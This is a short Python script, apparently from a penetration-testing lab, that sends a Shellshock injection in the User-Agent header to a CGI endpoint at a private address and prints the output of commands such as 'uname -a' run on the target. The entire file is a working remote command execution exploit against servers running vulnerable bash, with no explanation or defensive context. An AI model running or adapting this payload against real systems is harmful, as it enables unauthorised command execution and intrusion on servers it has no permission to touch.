import requests

headers = {
    'User-Agent': '() { :; }; /bin/bash -c \'echo aaaa; uname -a; echo zzzz;\'',
}

response = requests.get('http://10.11.1.71/cgi-bin/admin.cgi', headers=headers)
print(response.text)